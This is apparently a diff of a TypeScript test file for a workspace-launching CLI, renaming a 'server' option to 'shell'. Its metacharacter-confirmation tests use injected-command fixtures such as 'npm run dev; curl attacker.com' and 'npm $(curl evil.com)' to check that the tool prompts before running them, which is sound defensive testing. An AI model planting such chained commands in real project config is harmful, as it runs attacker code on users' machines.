@@ -150,7 +150,7 @@ describe("script execution", () => {
       expect.objectContaining({
         leftColumnCount: 1,
         rightColumnEditorCount: 0,
-        hasServer: false,
+        hasShell: false,
       }),
       "/tmp/workspace",
       expect.any(String),
@@ -209,8 +209,8 @@ describe("config resolution", () => {
     const { opts } = resolveConfig("/tmp/workspace", {});
     // Preset minimal sets editorPanes=1, but project overrides to 4
     expect(opts.editorPanes).toBe(4);
-    // Preset minimal sets server=false, no override → stays false
-    expect(opts.server).toBe("false");
+    // Preset minimal sets shell=false, no override → stays false
+    expect(opts.shell).toBe("false");
   });
 
   it("empty config strings do not override preset values", () => {
@@ -229,7 +229,7 @@ describe("config resolution", () => {
     const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
     const { opts } = resolveConfig("/tmp/workspace", { layout: "cli" });
 
-    // cli preset: editorPanes=1, server="true"
+    // cli preset: editorPanes=1, shell="true"
     // Empty config strings should NOT override these
     expect(opts.editorPanes).toBe(1);
     expect(opts.editorSize).toBeUndefined(); // fall through to planLayout default
@@ -409,14 +409,14 @@ describe("command dependency checks", () => {
     errorSpy.mockRestore();
   });
 
-  it("shows correct CLI syntax in error message for server", async () => {
+  it("shows correct CLI syntax in error message for shell", async () => {
     mockExecFileSync.mockImplementation((bin: string, args?: string[]) => {
-      if (bin === "/bin/sh" && Array.isArray(args) && args[3] === "unknown-server") throw new Error("not found");
+      if (bin === "/bin/sh" && Array.isArray(args) && args[3] === "unknown-shell") throw new Error("not found");
       if (bin === "/bin/sh" && Array.isArray(args) && args[0] === "-c" && typeof args[1] === "string" && args[1].startsWith("command -v"))
         return "/usr/bin/stub\n";
       return "";
     });
-    vi.mocked(listConfig).mockReturnValue(new Map([["server", "unknown-server run dev"]]));
+    vi.mocked(listConfig).mockReturnValue(new Map([["shell", "unknown-shell run dev"]]));
 
     const mockExit = vi.spyOn(process, "exit").mockImplementation(() => {
       throw new Error("process.exit");
@@ -428,7 +428,7 @@ describe("command dependency checks", () => {
     const errorMessages = errorSpy.mock.calls.map((c) => c[0] as string);
     const configMsg = errorMessages.find((m) => m.includes("summon"));
     expect(configMsg).toBeDefined();
-    expect(configMsg).toContain("summon set server <command>");
+    expect(configMsg).toContain("summon set shell <command>");
 
     mockExit.mockRestore();
     errorSpy.mockRestore();
@@ -899,7 +899,7 @@ describe("command resolution deduplication (#32)", () => {
       return "";
     });
 
-    await launch("/tmp/workspace", { server: "npm run dev" });
+    await launch("/tmp/workspace", { shell: "npm run dev" });
 
     // "command -v npm" should be called only once
     const npmCalls = mockExecFileSync.mock.calls.filter(
@@ -1101,25 +1101,25 @@ describe("dry-run summary header (#85)", () => {
     logSpy.mockRestore();
   });
 
-  it("includes server=true in the summary when server is enabled", async () => {
+  it("includes shell=true in the summary when shell is enabled", async () => {
     vi.mocked(listConfig).mockReturnValue(new Map());
     const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});
 
     await launch("/tmp/workspace", { dryRun: true });
 
     const output = logSpy.mock.calls[0]![0] as string;
-    expect(output).toContain("server=true");
+    expect(output).toContain("shell=true");
     logSpy.mockRestore();
   });
 
-  it("includes server=false in the summary when server is disabled", async () => {
+  it("includes shell=false in the summary when shell is disabled", async () => {
     vi.mocked(listConfig).mockReturnValue(new Map());
     const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});
 
     await launch("/tmp/workspace", { dryRun: true, layout: "minimal" });
 
     const output = logSpy.mock.calls[0]![0] as string;
-    expect(output).toContain("server=false");
+    expect(output).toContain("shell=false");
     logSpy.mockRestore();
   });
 });
@@ -1147,7 +1147,7 @@ describe("path resolution", () => {
     );
   });
 
-  it("resolves only the binary part of compound server commands", async () => {
+  it("resolves only the binary part of compound shell commands", async () => {
     mockExecFileSync.mockImplementation((bin: string, args?: string[]) => {
       if (bin === "/bin/sh" && Array.isArray(args) && args[3] === "npm") return "/usr/local/bin/npm\n";
       if (bin === "/bin/sh" && Array.isArray(args) && args[0] === "-c" && typeof args[1] === "string" && args[1].startsWith("command -v"))
@@ -1156,11 +1156,11 @@ describe("path resolution", () => {
     });
     vi.mocked(listConfig).mockReturnValue(new Map());
 
-    await launch("/tmp/workspace", { server: "npm run dev" });
+    await launch("/tmp/workspace", { shell: "npm run dev" });
 
     expect(mockGenerateAppleScript).toHaveBeenCalledWith(
       expect.objectContaining({
-        serverCommand: "/usr/local/bin/npm run dev",
+        shellCommand: "/usr/local/bin/npm run dev",
       }),
       "/tmp/workspace",
       expect.any(String),
@@ -1182,7 +1182,7 @@ describe("shell metacharacter confirmation (#90)", () => {
 
   it("does not prompt when .summon values are safe", async () => {
     mockReadKVFile.mockReturnValue(
-      new Map([["editor", "vim"], ["sidebar", "lazygit"], ["server", "npm run dev"]]),
+      new Map([["editor", "vim"], ["sidebar", "lazygit"], ["shell", "npm run dev"]]),
     );
     vi.mocked(listConfig).mockReturnValue(new Map());
 
@@ -1194,7 +1194,7 @@ describe("shell metacharacter confirmation (#90)", () => {
 
   it("prompts when .summon file contains semicolons in command values", async () => {
     mockReadKVFile.mockReturnValue(
-      new Map([["server", "npm run dev; curl attacker.com"]]),
+      new Map([["shell", "npm run dev; curl attacker.com"]]),
     );
     vi.mocked(listConfig).mockReturnValue(new Map());
 
@@ -1235,7 +1235,7 @@ describe("shell metacharacter confirmation (#90)", () => {
 
   it("prompts when .summon file contains ampersand in command values", async () => {
     mockReadKVFile.mockReturnValue(
-      new Map([["server", "npm run dev & evil"]]),
+      new Map([["shell", "npm run dev & evil"]]),
     );
     vi.mocked(listConfig).mockReturnValue(new Map());
 
@@ -1255,7 +1255,7 @@ describe("shell metacharacter confirmation (#90)", () => {
 
   it("prompts when .summon file contains backticks in command values", async () => {
     mockReadKVFile.mockReturnValue(
-      new Map([["server", "npm run `evil`"]]),
+      new Map([["shell", "npm run `evil`"]]),
     );
     vi.mocked(listConfig).mockReturnValue(new Map());
 
@@ -1275,7 +1275,7 @@ describe("shell metacharacter confirmation (#90)", () => {
 
   it("prompts when .summon file contains $( in command values", async () => {
     mockReadKVFile.mockReturnValue(
-      new Map([["server", "npm $(curl evil.com)"]]),
+      new Map([["shell", "npm $(curl evil.com)"]]),
     );
     vi.mocked(listConfig).mockReturnValue(new Map());
 
@@ -1295,7 +1295,7 @@ describe("shell metacharacter confirmation (#90)", () => {
 
   it("prompts when .summon file contains redirect operators in command values", async () => {
     mockReadKVFile.mockReturnValue(
-      new Map([["server", "npm run dev > /tmp/log"]]),
+      new Map([["shell", "npm run dev > /tmp/log"]]),
     );
     vi.mocked(listConfig).mockReturnValue(new Map());
 
@@ -1315,7 +1315,7 @@ describe("shell metacharacter confirmation (#90)", () => {
 
   it("exits with code 1 when user declines the confirmation", async () => {
     mockReadKVFile.mockReturnValue(
-      new Map([["server", "npm run dev; curl attacker.com"]]),
+      new Map([["shell", "npm run dev; curl attacker.com"]]),
     );
     vi.mocked(listConfig).mockReturnValue(new Map());
 
@@ -1338,7 +1338,7 @@ describe("shell metacharacter confirmation (#90)", () => {
 
   it("exits with code 1 when user presses Enter (default is deny)", async () => {
     mockReadKVFile.mockReturnValue(
-      new Map([["server", "npm run dev; curl attacker.com"]]),
+      new Map([["shell", "npm run dev; curl attacker.com"]]),
     );
     vi.mocked(listConfig).mockReturnValue(new Map());
 
@@ -1361,7 +1361,7 @@ describe("shell metacharacter confirmation (#90)", () => {
 
   it("proceeds when user confirms with 'y'", async () => {
     mockReadKVFile.mockReturnValue(
-      new Map([["server", "npm run dev; echo done"]]),
+      new Map([["shell", "npm run dev; echo done"]]),
     );
     vi.mocked(listConfig).mockReturnValue(new Map());
 
@@ -1380,7 +1380,7 @@ describe("shell metacharacter confirmation (#90)", () => {
 
   it("proceeds when user confirms with 'yes'", async () => {
     mockReadKVFile.mockReturnValue(
-      new Map([["server", "npm run dev; echo done"]]),
+      new Map([["shell", "npm run dev; echo done"]]),
     );
     vi.mocked(listConfig).mockReturnValue(new Map());
 
@@ -1398,7 +1398,7 @@ describe("shell metacharacter confirmation (#90)", () => {
 
   it("exits with code 1 on non-TTY stdin with dangerous commands", async () => {
     mockReadKVFile.mockReturnValue(
-      new Map([["server", "npm run dev; curl attacker.com"]]),
+      new Map([["shell", "npm run dev; curl attacker.com"]]),
     );
     vi.mocked(listConfig).mockReturnValue(new Map());
 
@@ -1423,7 +1423,7 @@ describe("shell metacharacter confirmation (#90)", () => {
 
   it("skips metacharacter check when --dry-run is set", async () => {
     mockReadKVFile.mockReturnValue(
-      new Map([["server", "npm run dev; curl attacker.com"]]),
+      new Map([["shell", "npm run dev; curl attacker.com"]]),
     );
     vi.mocked(listConfig).mockReturnValue(new Map());
 
@@ -1447,7 +1447,7 @@ describe("shell metacharacter confirmation (#90)", () => {
 
     const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
 
-    await launch("/tmp/workspace", { server: "npm run dev; echo done" });
+    await launch("/tmp/workspace", { shell: "npm run dev; echo done" });
 
     // No metacharacter warning should appear
     const warnMessages = warnSpy.mock.calls.map((c) => c[0] as string);
@@ -1459,7 +1459,7 @@ describe("shell metacharacter confirmation (#90)", () => {
   it("does not prompt for metacharacters from machine config", async () => {
     mockReadKVFile.mockReturnValue(new Map()); // empty .summon file
     vi.mocked(listConfig).mockReturnValue(
-      new Map([["server", "npm run dev; echo done"]]),
+      new Map([["shell", "npm run dev; echo done"]]),
     );
 
     const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
@@ -1476,7 +1476,7 @@ describe("shell metacharacter confirmation (#90)", () => {
     mockReadKVFile.mockReturnValue(
       new Map([
         ["editor", "vim | tee"],
-        ["server", "npm run dev; curl evil.com"],
+        ["shell", "npm run dev; curl evil.com"],
       ]),
     );
     vi.mocked(listConfig).mockReturnValue(new Map());
@@ -1494,7 +1494,7 @@ describe("shell metacharacter confirmation (#90)", () => {
     expect(metaWarning).toBeDefined();
     expect(metaWarning).toContain("editor");
     expect(metaWarning).toContain("vim | tee");
-    expect(metaWarning).toContain("server");
+    expect(metaWarning).toContain("shell");
     expect(metaWarning).toContain("npm run dev; curl evil.com");
 
     warnSpy.mockRestore();
@@ -1519,13 +1519,13 @@ describe("shell metacharacter confirmation (#90)", () => {
 
   it("resolveConfig returns projectOverrides from .summon file", () => {
     mockReadKVFile.mockReturnValue(
-      new Map([["editor", "vim"], ["server", "npm run dev"]]),
+      new Map([["editor", "vim"], ["shell", "npm run dev"]]),
     );
     vi.mocked(listConfig).mockReturnValue(new Map());
 
     const result = resolveConfig("/tmp/workspace", {});
     expect(result.projectOverrides).toBeInstanceOf(Map);
     expect(result.projectOverrides.get("editor")).toBe("vim");
-    expect(result.projectOverrides.get("server")).toBe("npm run dev");
+    expect(result.projectOverrides.get("shell")).toBe("npm run dev");
   });
 });
